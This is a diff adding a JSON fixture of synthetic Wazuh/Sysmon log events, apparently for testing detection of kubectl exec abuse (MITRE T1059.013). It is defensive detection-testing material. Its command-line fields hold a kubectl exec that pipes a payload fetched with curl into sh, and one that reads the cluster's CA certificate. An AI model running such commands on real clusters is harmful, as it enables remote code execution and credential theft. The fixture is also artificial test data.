@@ -1,0 +1,140 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.013",
+    "variation": "002",
+    "name": "Container CLI - kubectl exec",
+    "description": "Adversary uses kubectl exec to execute commands in Kubernetes pods",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - kubectl exec into pod",
+      "sequence": 1,
+      "timestamp": "2026-02-08T15:10:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:10:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.013"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: Container CLI/API"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300030",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:10:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0013-000000000003}",
+            "processId": "35012",
+            "image": "/usr/local/bin/kubectl",
+            "commandLine": "kubectl exec -it frontend-pod-7b8c9d0e1f -- /bin/sh -c 'curl http://198.51.100.110/payload.sh | sh'",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0013-PARENT000003}",
+            "parentProcessId": "35000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.013",
+        "_fomorian_expected_detection": "Sigma: Kubectl Exec Suspicious Command (T1059.013)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - kubectl exec reading secrets",
+      "sequence": 2,
+      "timestamp": "2026-02-08T15:11:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:11:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.013"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: Container CLI/API"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300031",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:11:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0013-000000000004}",
+            "processId": "35056",
+            "image": "/usr/local/bin/kubectl",
+            "commandLine": "kubectl exec api-server-abc123 -- cat /etc/kubernetes/pki/ca.crt",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0013-PARENT000004}",
+            "parentProcessId": "35000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.013",
+        "_fomorian_expected_detection": "Sigma: Kubectl Exec PKI Access (T1059.013)"
+      }
+    }
+  ]
+}
